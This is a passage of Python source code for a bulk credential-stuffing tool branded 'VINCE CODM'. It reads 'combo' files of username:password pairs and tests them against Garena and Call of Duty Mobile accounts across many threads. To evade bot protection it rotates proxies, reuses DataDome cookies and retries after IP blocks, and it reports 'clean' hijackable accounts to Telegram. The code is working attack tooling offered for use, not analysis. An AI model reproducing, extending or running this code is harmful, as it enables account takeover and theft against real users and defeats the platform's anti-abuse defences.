        if len(name) > 35:
            name = name[:32] + "..."
        table.add_row(f"[yellow][ {i} ][/yellow]", name, format_size(size), f"{count:,}")
    
    console.print()
    console.print(Panel(table, title="[bold cyan]📂 SELECT A COMBO FILE[/bold cyan]", 
                       subtitle="[bold green]VINCE CODM[/bold green]", border_style="cyan", padding=(1,2)))
    console.print()
    
    return [item[0] for item in file_details]

def select_input_file_flow():
    available_files = find_and_list_account_files()
    if not available_files:
        _log('ERROR', 'No combo files found in Combo folder.')
        return None
    
    while True:
        try:
            choice_str = input(f"  {GRAY}➤{YELLOW} SELECT COMBO FILE [1-{len(available_files)}] : {WHITE}").strip()
            print(RESET, end="")
            if not choice_str:
                continue
            file_choice = int(choice_str) - 1
            if 0 <= file_choice < len(available_files):
                return available_files[file_choice]
            else:
                _log('ERROR', 'Invalid number.')
        except (ValueError, IndexError):
            _log('ERROR', 'Invalid input.')

# ============ BULK CHECK ============

def bulk_check():
    clear_screen()
    display_banner()
    
    # Setup Telegram first
    console.print(Panel(
        "[yellow]TELEGRAM SETUP[/yellow]\n"
        "[white]Get notified when clean accounts are found[/white]",
        title="[bold green]TELEGRAM NOTIFICATIONS[/bold green]",
        border_style="cyan",
        box=box.ROUNDED,
        padding=(1, 2)
    ))
    console.print()
    
    setup_choice = console.input("[cyan]Do you want to set up Telegram notifications? (y/n): [/cyan]").strip().lower()
    if setup_choice == 'y':
        setup_telegram_prompt()
    else:
        console.print("[yellow]⚠ Telegram notifications disabled.[/yellow]")
        global TELEGRAM_ENABLED
        TELEGRAM_ENABLED = False
    
    console.print()
    console.print(Panel(
        "[yellow]BULK CHECK MODE[/yellow]\n"
        "[white]Scan multiple accounts from a combo file[/white]\n"
        "[white]Results saved to [cyan]Results/[/cyan] folder[/white]",
        title="[bold green]BULK CHECK[/bold green]",
        border_style="cyan",
        box=box.ROUNDED,
        padding=(1, 2)
    ))
    print()
    
    selected_file = select_input_file_flow()
    if not selected_file:
        _log('ERROR', 'No file selected.')
        input(f"\n{GRAY}[Press Enter to exit]{RESET} ")
        return
    
    accounts = []
    try:
        with open(selected_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                acc, pwd = clean_account_line(line)
                if acc and pwd:
                    accounts.append(f"{acc}:{pwd}")
        _log('SUCCESS', f'File loaded: [bold]{len(accounts):,}[/bold] accounts')
    except:
        _log('ERROR', 'Could not read file.')
        return
    
    if not accounts:
        _log('ERROR', 'No valid accounts found in file.')
        return
    
    _log('INFO', f'Total accounts queued: [bold]{len(accounts):,}[/bold]')
    
    # Proxy configuration
    proxy_table = Table(box=box.ROUNDED, expand=True, show_header=False, padding=(0,1))
    proxy_table.add_column("ID", width=6)
    proxy_table.add_column("Option")
    proxy_table.add_row("[cyan]1[/cyan]", "USE PROXIES.TXT")
    proxy_table.add_row("[cyan]2[/cyan]", "NO PROXY (Recommended)")
    console.print(Panel(proxy_table, title="[yellow]PROXY CONFIGURATION[/yellow]", border_style="yellow", padding=(0,1)))
    
    proxy_manager = None
    while True:
        choice = console.input("[cyan]➤ Choice: [/cyan]").strip()
        if choice in ("1","2"):
            break
        _log('ERROR', 'Invalid choice. Select 1 or 2.')
    
    if choice == "1" and os.path.exists("proxies.txt"):
        proxy_manager = ProxyManager()
        if proxy_manager.is_loaded():
            _log('SUCCESS', f'Loaded [bold]{len(proxy_manager.proxies)}[/bold] proxies')
        else:
            _log('WARNING', 'No valid proxies found.')
            proxy_manager = None
    elif choice == "1":
        _log('WARNING', 'proxies.txt not found! Running without proxies.')
    
    max_threads = 30 if proxy_manager else 20
    
    thread_table = Table(box=box.ROUNDED, expand=True, show_header=False, padding=(0,1))
    thread_table.add_column("Threads", width=12)
    thread_table.add_column("Speed")
    thread_table.add_row("[green]1-8[/green]", "Safe (Recommended)")
    thread_table.add_row("[yellow]9-20[/yellow]", "Medium Speed")
    thread_table.add_row("[cyan]21-30[/cyan]" if proxy_manager else "[cyan]11-20[/cyan]", "Fast (Proxy Only)" if proxy_manager else "Fast")
    console.print(Panel(thread_table, title="[yellow]THREAD CONFIGURATION[/yellow]", border_style="yellow", padding=(0,1)))
    
    while True:
        try:
            raw = console.input(f"[cyan]➤ Threads 1-{max_threads} (default {DEFAULT_THREADS}): [/cyan]").strip()
            num_threads = DEFAULT_THREADS if not raw else int(raw)
            if 1 <= num_threads <= max_threads:
                break
            _log('ERROR', f'Enter value between 1 and {max_threads}')
        except ValueError:
            _log('ERROR', 'Invalid number.')
    
    _log('SUCCESS', f'Running with [bold]{num_threads}[/bold] thread(s)')
    
    global CHECK_OTHER_GAMES
    game_table = Table(box=box.ROUNDED, expand=True, show_header=False, padding=(0,1))
    game_table.add_column("Info")
    game_table.add_row("[magenta]OTHER GAMES CHECK[/magenta]")
    game_table.add_row("AOV / ROV / Free Fire / Delta Force")
    game_table.add_row("[yellow]Adds ~1-3 seconds per account[/yellow]")
    game_table.add_row("Each game saved to separate result file")
    console.print(Panel(game_table, title="[magenta]GAME CONNECTIONS[/magenta]", border_style="magenta", padding=(0,1)))
    
    CHECK_OTHER_GAMES = console.input("[magenta]◇ Check other games? (y/N): [/magenta]").strip().lower() == "y"
    _log('SUCCESS' if CHECK_OTHER_GAMES else 'INFO', 
         'Will scan all Garena game connections' if CHECK_OTHER_GAMES else 'CODM only — skipping other game checks')
    
    results_manager = ResultsManager(selected_file)
    cookie_manager = CookieManager()
    datadome_manager = DataDomeManager()
    live_stats = LiveStats()
    live_stats.total_accounts = len(accounts)
    
    summary = Table(box=box.ROUNDED, expand=True, show_header=False, padding=(0, 1))
    summary.add_column("Label", style="bold white", width=25)
    summary.add_column("Value", justify="left")
    summary.add_row("📦 ACCOUNTS LOADED", f"[green]{len(accounts):,}[/green]")
    summary.add_row("🧵 THREADS CHOSEN", f"[cyan]{num_threads}[/cyan]")
    summary.add_row("🍪 VALID COOKIES", f"[yellow]{len(cookie_manager.get_valid_cookies())}[/yellow]")
    summary.add_row("🌐 PROXIES", f"[green]{len(proxy_manager.proxies)}[/green]" if proxy_manager else "[red]DISABLED[/red]")
    summary.add_row("📱 TELEGRAM", f"[green]ENABLED[/green]" if TELEGRAM_ENABLED else "[red]DISABLED[/red]")
    console.print(Panel(summary, title="[bold yellow]PRE-CHECK SUMMARY[/bold yellow]", border_style="bright_yellow", box=box.ROUNDED, padding=(1, 2)))
    
    print("\n" * 2)
    
    _suppress_ip_prints = True
    _ip_block_callback = lambda blocked: None
    
    _thread_local = threading.local()
    
    def _get_thread_resources():
        if not hasattr(_thread_local, "session") or not hasattr(_thread_local, "datadome"):
            _thread_local.session = requests.Session()
            _thread_local.datadome = DataDomeManager()
            
            if proxy_manager and proxy_manager.is_loaded():
                _thread_local.session.proxies.update(proxy_manager.get_next())
            
            proxy_dict = dict(_thread_local.session.proxies) if proxy_manager and proxy_manager.is_loaded() else None
            valid_cookies = cookie_manager.get_valid_cookies()
            
            if valid_cookies:
                applyck(_thread_local.session, "; ".join(valid_cookies))
                for part in valid_cookies[-1].split(";"):
                    if part.strip().startswith("datadome="):
                        _thread_local.datadome.set_datadome(part.split("=", 1)[1].strip())
                        break
            else:
                dd = get_datadome_cookie(_thread_local.session, proxies=proxy_dict)
                if dd:
                    _thread_local.datadome.set_datadome(dd)
        
        return _thread_local.session, _thread_local.datadome
    
    def _worker(account_line):
        if not account_line or ":" not in account_line:
            return ("DONE", account_line, {})
        
        try:
            account, password = account_line.split(":", 1)
            account, password = account.strip(), password.strip()
            session, datadome_mgr = _get_thread_resources()
            
            with live_stats.lock:
                live_stats.current_account = account
            
            status, account_data = processaccount(session, account, password, cookie_manager, datadome_mgr, 
                                                 live_stats, results_manager, auto_remove=False, 
                                                 proxy_manager=proxy_manager)
            
            return status, account, account_data or {}
        except Exception:
            return "ERROR", account_line, {}
    
    def _wrapped_worker(account_line):
        retry_count = 0
        while True:
            status, acc_name, account_data = _worker(account_line)
            if status != 'IP_CHANGED':
                break
            if hasattr(_thread_local, 'session'):
                _thread_local.session.close()
                del _thread_local.session
            if hasattr(_thread_local, 'datadome'):
                del _thread_local.datadome
            retry_count += 1
            if retry_count >= 3:
                break
            time.sleep(2)
        
        try:
            stats = live_stats.get_stats()
            if live:
                live.update(build_live_stats_ui(stats))
        except:
            pass
        
        return status, acc_name, account_data or {}
    
    live = Live(build_live_stats_ui(live_stats.get_stats()), console=console, refresh_per_second=4)
    live.start()
    
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = {executor.submit(_wrapped_worker, ln): ln for ln in accounts}
        for future in as_completed(futures):
            try:
                future.result()
            except:
                pass
    
    live.stop()
    _suppress_ip_prints = False
    _ip_block_callback = None
    print()
    
    stats = live_stats.get_stats()
    
    # Get highest clean account info
    highest_clean_account = live_stats.highest_clean_account
    if highest_clean_account:
        highest_clean_account_info = f"{highest_clean_account} (Level {live_stats.highest_clean_level})"
    else:
        highest_clean_account_info = None
    
    display_summary(stats.get('checked', 0), stats.get('invalid', 0) + stats.get('error', 0), stats.get('valid', 0),
                   live_stats.categorized_levels, live_stats.countries, len(accounts), 
                   live_stats.highest_clean_level, live_stats.highest_nc_level, live_stats.highest_shell,
                   highest_clean_account_info)
    
    print(f'  {GRAY}Results saved to: Results/output_{Path(selected_file).stem}/{RESET}')
    if TELEGRAM_ENABLED:
        print(f'  {GREEN}✓ Telegram notifications enabled for clean accounts{RESET}')
    print()
    input(f'  {GRAY}[Press Enter to exit]{RESET} ')

# ============ MAIN ============

def main():
    try:
        # Load Telegram config if exists
        if load_telegram_config():
            _log('SUCCESS', 'Telegram notifications loaded from config!')
        else:
            # Will be prompted in bulk_check
            pass
        
        bulk_check()
    except KeyboardInterrupt:
        print(f'\n  {YELLOW}⚠  Script terminated by user.{RESET}\n')
    except Exception as e:
        import traceback
        print(f'\n  {RED}✖  Unexpected error: {e}{RESET}')
        traceback.print_exc()

if __name__ == '__main__':
    main()
